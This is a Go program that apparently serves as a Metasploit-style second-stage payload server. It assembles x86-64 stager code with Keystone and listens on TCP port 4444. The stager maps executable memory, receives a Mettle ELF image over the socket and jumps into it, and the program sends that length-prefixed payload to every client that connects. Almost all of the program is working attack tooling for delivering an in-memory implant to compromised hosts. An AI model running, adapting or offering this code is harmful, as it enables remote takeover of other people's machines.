package main

import (
	"encoding/binary"
	"fmt"
	"github.com/Binject/debug/elf"
	log "github.com/sirupsen/logrus"
	"io"
	"net"
	"os"
	"strings"

	"github.com/keystone-engine/keystone/bindings/go/keystone"
)

func deComment(asm string) string {
	var final string
	for _, each := range strings.Split(asm, "\n") {
		instruction := strings.SplitN(each, ";", 2)[0]
		final += instruction + "\n"
	}
	return final
}

func prependPayloadSize(payload []byte) []byte {
	payloadSize := uint32(len(payload))
	lenBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(lenBuf, payloadSize)
	return append(lenBuf, payload...)
}

func GetEntryAddr(f *os.File) int {
	f.Seek(0, 0)
	elfFile, err := elf.NewFile(f)
	if err != nil {
		log.Fatal(err)
	}
	log.Info("Found Entry: ", elfFile.Entry)
	return int(elfFile.Entry)
}

func main() {
	// 初始化 Keystone，选择架构和模式（例如 x86 32位）
	ks, err := keystone.New(keystone.ARCH_X86, keystone.MODE_64)
	if err != nil {
		log.Fatal("init failed:", err)
	}
	defer ks.Close() // 确保释放资源

	// 设置汇编语法（例如 Intel 语法）
	ks.Option(keystone.OPT_SYNTAX, keystone.OPT_SYNTAX_INTEL)

	f, err := os.Open("shellcode.elf")
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()
	payload, err := io.ReadAll(f)
	if err != nil {
		log.Fatal("Read shellcode elf failed", err)
	}

	var payload_len = len(payload)
	var payload_addr = GetEntryAddr(f)

	assembly := fmt.Sprintf(`
      push rdi                    ; save sockfd
      xor rdi, rdi                ; address
      mov rsi, %v  ; length
      mov rdx, 0x7                ; PROT_READ | PROT_WRITE | PROT_EXECUTE
      mov r10, 0x22               ; MAP_PRIVATE | MAP_ANONYMOUS
      xor r8, r8                  ; fd
      xor r9, r9                  ; offset
      mov rax, 0x9                ; mmap
      syscall

      ; receive mettle process image
      mov rdx, rsi                ; length
      mov rsi, rax                ; address
      pop rdi                     ; sockfd
      mov r10, 0x100              ; MSG_WAITALL
      xor r8, r8                  ; srcaddr
      xor r9, r9                  ; addrlen
      mov rax, 45                 ; recvfrom
      syscall

      ; setup stack
      and rsp, -0x10              ; Align
      add sp, 80                  ; Add room for initial stack and prog name
      mov rax, 109                ; prog name "m"
      push rax                    ;
      mov rcx, rsp                ; save the stack
      xor rbx, rbx
      push rbx                    ; NULL
      push rbx                    ; AT_NULL
      push rsi                    ; mmap'd a ddress
      mov rax, 7                  ; AT_BASE
      push rax
      push rbx                    ; end of ENV
      push rbx                    ; NULL
      push rdi                    ; ARGV[1] int sockfd
      push rcx                    ; ARGV[0] char *prog_name
      mov rax, 2                  ; ARGC
      push rax

      ; down the rabbit hole
      mov rax, %v 
      add rsi, rax
      jmp rsi
`, payload_len, payload_addr)
	assembly = deComment(assembly)
	// 汇编指令
	insn, _, ok := ks.Assemble(assembly, 0)
	if !ok {
		log.Fatal("asm failed, ", ks.LastError())
	}

	// 输出机器码的十六进制表示
	log.Infof("asm code: %s\n bytecode: %x\n", assembly, insn)
	log.Info("payload_len: ", payload_len)
	log.Info("payload_addr: ", payload_addr)
	log.Info("payload pre-payload: ", insn)
	log.Info("len of pre-payload payload: ", len(insn))

	finalpayload := prependPayloadSize(append(insn, payload...))
	fmt.Printf("finalpayload: %x\n", finalpayload)

	l, err := net.Listen("tcp", ":4444")
	if err != nil {
		log.Fatal(err)
	}
	defer l.Close()

	for conn, err := l.Accept(); err == nil; conn, err = l.Accept() {
		var nt int
		nt, err = conn.Write(finalpayload)
		if nt != len(finalpayload) {
			log.Warnf("write %d bytes, expect %d bytes", nt, len(finalpayload))
		}
		err = conn.Close()
	}
}
